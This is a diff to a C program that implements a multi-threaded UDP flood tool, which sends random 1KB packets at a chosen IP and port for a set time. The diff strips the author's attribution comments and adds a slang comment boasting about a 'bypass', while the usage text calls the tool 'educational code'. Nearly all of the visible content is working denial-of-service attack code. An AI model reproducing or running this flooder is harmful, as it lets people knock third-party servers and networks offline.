@@ -18,7 +18,6 @@ typedef struct {
 } attack_params;
 
 void *udp_flood(void *arg) {
-    // github.com/scallydima - udp flood implementation
     attack_params *params = (attack_params *)arg;
     
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -31,16 +30,13 @@ void *udp_flood(void *arg) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(params->target_port);
     addr.sin_addr.s_addr = inet_addr(params->target_ip);
-    
-    // github.com/scallydima - random payload generator
     char *packet = malloc(params->packet_size);
     for (int i = 0; i < params->packet_size; i++) {
         packet[i] = rand() % 256;
     }
     
     time_t end_time = time(NULL) + params->duration;
-    
-    // github.com/scallydima - flood loop
+
     while (time(NULL) < end_time) {
         sendto(sock, packet, params->packet_size, 0, 
                (struct sockaddr *)&addr, sizeof(addr));
@@ -52,7 +48,6 @@ void *udp_flood(void *arg) {
 }
 
 int main(int argc, char *argv[]) {
-    // github.com/scallydima - udp flood tool
     if (argc != 5) {
         printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
         printf("github.com/scallydima - educational code\n");
@@ -65,7 +60,7 @@ int main(int argc, char *argv[]) {
         .target_ip = argv[1],
         .target_port = atoi(argv[2]),
         .duration = atoi(argv[3]),
-        .packet_size = 1024  // 1KB packets
+        .packet_size = 1024  // 1KB packets brat, da eto izi bypass
     };
     
     int threads_count = atoi(argv[4]);
@@ -84,4 +79,5 @@ int main(int argc, char *argv[]) {
     }
     
     return 0;
+
 }
